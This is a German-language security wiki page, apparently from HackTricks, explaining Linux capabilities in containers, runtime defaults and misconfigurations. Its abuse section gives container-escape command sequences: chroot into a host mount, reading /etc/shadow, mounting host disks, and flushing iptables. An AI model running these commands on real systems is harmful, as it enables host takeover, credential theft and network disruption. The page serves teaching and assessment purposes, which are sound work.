# Linux Capabilities in Containern

{{#include ../../../../banners/hacktricks-training.md}}

## Übersicht

Linux capabilities sind eines der wichtigsten Elemente der Container-Sicherheit, weil sie eine subtile, aber grundlegende Frage beantworten: **was bedeutet "root" wirklich innerhalb eines Containers?** Auf einem normalen Linux-System bedeutete UID 0 historisch gesehen einen sehr weiten Privilegensatz. In modernen Kerneln wird dieses Privileg in kleinere Einheiten namens capabilities zerlegt. Ein Prozess kann als root laufen und trotzdem viele mächtige Operationen nicht ausführen, wenn die relevanten capabilities entfernt wurden.

Container sind stark von dieser Unterscheidung abhängig. Viele Workloads werden aus Kompatibilitäts- oder Vereinfachungsgründen weiterhin als UID 0 im Container gestartet. Ohne das Entfernen von capabilities wäre das viel zu gefährlich. Durch das Entfernen von capabilities kann ein containerisierter root-Prozess viele gewöhnliche Aufgaben im Container ausführen, während ihm empfindlichere Kernel-Operationen verweigert werden. Deshalb bedeutet eine Container-Shell, die `uid=0(root)` anzeigt, nicht automatisch „host root“ oder gar ein umfassendes Kernel-Privileg. Die Capability-Sets entscheiden, wie viel diese root-Identität tatsächlich wert ist.

Für die vollständige Linux capability-Referenz und viele Missbrauchsbeispiele siehe:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Funktionsweise

Capabilities werden in mehreren Sets verfolgt, darunter permitted, effective, inheritable, ambient und bounding sets. Für viele Container-Assessments sind die genauen Kernel-Semantiken jedes Sets weniger unmittelbar wichtig als die praktische Frage: **welche privilegierten Operationen kann dieser Prozess gerade jetzt erfolgreich ausführen, und welche künftigen Privilegiengewinne sind noch möglich?**

Weshalb das wichtig ist: Viele Breakout-Techniken sind in Wahrheit capability-Probleme, die als Container-Probleme getarnt sind. Ein Workload mit `CAP_SYS_ADMIN` kann auf eine enorme Menge an Kernel-Funktionalität zugreifen, die ein normaler Container-root-Prozess nicht anfassen sollte. Ein Workload mit `CAP_NET_ADMIN` wird deutlich gefährlicher, wenn es zusätzlich das host network namespace teilt. Ein Workload mit `CAP_SYS_PTRACE` wird viel interessanter, wenn es Host-Prozesse durch host PID sharing sehen kann. In Docker oder Podman kann sich das als `--pid=host` zeigen; in Kubernetes erscheint es meist als `hostPID: true`.

Anders ausgedrückt: Das Capability-Set kann nicht isoliert bewertet werden. Es muss zusammen mit namespaces, seccomp und MAC policy gelesen werden.

## Lab

Eine sehr direkte Methode, capabilities innerhalb eines Containers zu inspizieren, ist:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Sie können auch einen restriktiveren container mit einem vergleichen, dem alle capabilities hinzugefügt wurden:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Um die Wirkung einer gezielten Ergänzung zu sehen, versuchen Sie, alles zu entfernen und nur eine capability wieder hinzuzufügen:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Diese kleinen Experimente zeigen, dass eine Runtime nicht einfach einen Boolean namens "privileged" umschaltet. Sie formt die tatsächliche Privilegienoberfläche, die dem Prozess zur Verfügung steht.

## Hochrisiko-Capabilities

Obwohl viele Capabilities je nach Ziel wichtig sein können, sind einige immer wieder relevant bei der Analyse von container escapes.

**`CAP_SYS_ADMIN`** ist diejenige, die Verteidiger mit größter Skepsis behandeln sollten. Sie wird oft als "the new root" beschrieben, weil sie eine enorme Menge an Funktionalität freischaltet, einschließlich mount-bezogener Operationen, namespace-sensitivem Verhalten und vieler Kernel-Pfade, die niemals leichtfertig Containern ausgesetzt werden sollten. Wenn ein Container `CAP_SYS_ADMIN`, schwaches seccomp und keine starke MAC confinement hat, werden viele klassische breakout paths deutlich realistischer.

**`CAP_SYS_PTRACE`** ist wichtig, wenn Prozesssichtbarkeit besteht, besonders wenn der PID namespace mit dem Host oder mit interessanten Nachbar-Workloads geteilt wird. Es kann Sichtbarkeit in Manipulation verwandeln.

**`CAP_NET_ADMIN`** und **`CAP_NET_RAW`** sind in netzwerkfokussierten Umgebungen relevant. In einem isolierten Bridge-Netzwerk können sie bereits riskant sein; in einem geteilten Host-Netzwerknamespace sind sie deutlich schlimmer, weil der Workload möglicherweise Host-Netzwerke neu konfigurieren, sniffen, spoofen oder lokalen Traffic stören kann.

**`CAP_SYS_MODULE`** ist in einer rootful-Umgebung normalerweise katastrophal, weil das Laden von Kernel-Modulen effektiv Kontrolle über den Host-Kernel bedeutet. Es sollte fast nie in einem allgemeinen Container-Workload erscheinen.

## Runtime-Nutzung

Docker, Podman, containerd-basierte Stacks und CRI-O verwenden alle Capability-Kontrollen, aber die Defaults und Management-Interfaces unterscheiden sich. Docker exponiert sie sehr direkt über Flags wie `--cap-drop` und `--cap-add`. Podman bietet ähnliche Kontrollen und profitiert häufig von rootless-Ausführung als zusätzliche Sicherheitsschicht. Kubernetes macht Capability-Additionen und -Drops über den Pod- oder Container-`securityContext` sichtbar. System-Container-Umgebungen wie LXC/Incus verlassen sich ebenfalls auf Capability-Kontrolle, aber die breitere Host-Integration dieser Systeme verführt Betreiber oft dazu, Defaults aggressiver zu lockern als in einer App-Container-Umgebung.

Dasselbe Prinzip gilt für alle: Eine Capability, die technisch vergeben werden kann, ist nicht unbedingt eine, die vergeben werden sollte. Viele reale Vorfälle beginnen damit, dass ein Betreiber eine Capability hinzufügt, einfach weil ein Workload unter einer strengeren Konfiguration fehlgeschlagen ist und das Team einen schnellen Fix brauchte.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist **`--cap-add=ALL`** in Docker/Podman-ähnlichen CLIs, aber das ist nicht der einzige. In der Praxis ist ein häufigeres Problem, dass ein oder zwei extrem mächtige Capabilities vergeben werden, besonders `CAP_SYS_ADMIN`, um "die Anwendung zum Laufen zu bringen", ohne die Auswirkungen auf namespace, seccomp und mount zu verstehen. Ein weiterer häufiger Fehler ist, zusätzliche Capabilities mit Host-Namespaces zu kombinieren. In Docker oder Podman kann sich das als `--pid=host`, `--network=host` oder `--userns=host` zeigen; in Kubernetes erscheint die äquivalente Exposition meist über Workload-Einstellungen wie `hostPID: true` oder `hostNetwork: true`. Jede dieser Kombinationen verändert, was die Capability tatsächlich beeinflussen kann.

Es ist außerdem üblich, dass Administratoren glauben, weil ein Workload nicht vollständig `--privileged` ist, sei er dennoch bedeutend eingeschränkt. Manchmal ist das wahr, aber manchmal ist die effektive Haltung bereits so nahe an privileged, dass der Unterschied operativ keine Rolle mehr spielt.

## Missbrauch

Der erste praktische Schritt ist, die effektive Capability-Menge zu enumerieren und sofort capability-spezifische Aktionen zu testen, die für escape oder den Zugriff auf Host-Informationen relevant wären:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Wenn `CAP_SYS_ADMIN` vorhanden ist, testen Sie zuerst mount-based abuse und den Zugriff auf das Host-Dateisystem, da dies einer der häufigsten breakout enablers ist:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Wenn `CAP_SYS_PTRACE` vorhanden ist und der container interessante Prozesse sehen kann, prüfe, ob die Capability in Prozessinspektion umgewandelt werden kann:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Wenn `CAP_NET_ADMIN` oder `CAP_NET_RAW` vorhanden ist, prüfen Sie, ob die Workload den sichtbaren Netzwerk-Stack manipulieren oder zumindest nützliche Netzwerkinformationen sammeln kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wenn ein capability-Test erfolgreich ist, kombiniere ihn mit der Namespace-Situation. Eine capability, die in einem isolierten Namespace nur riskant erscheint, kann sofort zu einem escape- oder host-recon-Primitiv werden, wenn der Container außerdem host PID, host network oder host mounts teilt.

### Vollständiges Beispiel: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Wenn der Container `CAP_SYS_ADMIN` hat und ein beschreibbarer bind mount des Host-Dateisystems wie `/host` vorhanden ist, ist der escape-Pfad oft geradlinig:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Wenn `chroot` erfolgreich ist, werden die Befehle nun im Kontext des Root-Dateisystems des Hosts ausgeführt:
```bash
id
hostname
cat /etc/shadow | head
```
Wenn `chroot` nicht verfügbar ist, kann dasselbe Ergebnis oft erreicht werden, indem man das Binary über den gemounteten Baum aufruft:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Vollständiges Beispiel: `CAP_SYS_ADMIN` + Gerätezugriff

Wenn ein Blockgerät des Hosts exponiert ist, kann `CAP_SYS_ADMIN` es in direkten Zugriff auf das Host-Dateisystem verwandeln:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Vollständiges Beispiel: `CAP_NET_ADMIN` + Host Networking

Diese Kombination führt nicht immer direkt zu host root, kann jedoch den host network stack vollständig neu konfigurieren:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Das kann denial of service, traffic interception oder den Zugriff auf zuvor gefilterte Dienste ermöglichen.

## Prüfungen

Das Ziel der Capability-Prüfungen ist nicht nur, rohe Werte auszugeben, sondern zu verstehen, ob der Prozess über genügend Privilegien verfügt, um seine aktuelle Namespace- und Mount-Situation gefährlich zu machen.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Was hier interessant ist:

- `capsh --print` ist der einfachste Weg, hochriskante Capabilities wie `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` oder `cap_sys_module` zu erkennen.
- Die `CapEff`-Zeile in `/proc/self/status` zeigt an, welche Capabilities derzeit tatsächlich wirksam sind, nicht nur, welche in anderen Sets verfügbar sein könnten.
- Ein Capability-Dump wird deutlich wichtiger, wenn der Container außerdem Host-PID-, Netzwerk- oder User-Namespaces teilt oder schreibbare Host-Mounts hat.

Nachdem Sie die rohen Capability-Informationen gesammelt haben, ist der nächste Schritt die Interpretation. Fragen Sie, ob der Prozess root ist, ob User-Namespaces aktiv sind, ob Host-Namespaces geteilt werden, ob seccomp durchgesetzt wird und ob AppArmor oder SELinux den Prozess weiterhin einschränken. Ein Capability-Set allein ist nur ein Teil der Geschichte, aber oft der Teil, der erklärt, warum ein Container-Breakout funktioniert und ein anderer mit dem gleichen scheinbaren Ausgangspunkt fehlschlägt.

## Standardwerte der Runtime

| Runtime / Plattform | Standardzustand | Standardverhalten | Übliche manuelle Abschwächungen |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig reduziertes Capability-Set | Docker behält eine standardmäßige Allowlist von Capabilities und entfernt den Rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Standardmäßig reduziertes Capability-Set | Podman-Container sind standardmäßig ohne Privilegien und verwenden ein reduziertes Capability-Modell | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Erbt die Runtime-Standardwerte, sofern nicht geändert | Wenn keine `securityContext.capabilities` angegeben sind, erhält der Container das Standard-Capability-Set der Runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | In der Regel Runtime-Standard | Die effektive Menge hängt von der Runtime plus der Pod-Spezifikation ab | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Für Kubernetes ist wichtig, dass die API kein einheitliches universelles Standard-Capability-Set definiert. Wenn der Pod weder Capabilities hinzufügt noch entfernt, erbt der Workload den Runtime-Standard dieses Nodes.
{{#include ../../../../banners/hacktricks-training.md}}
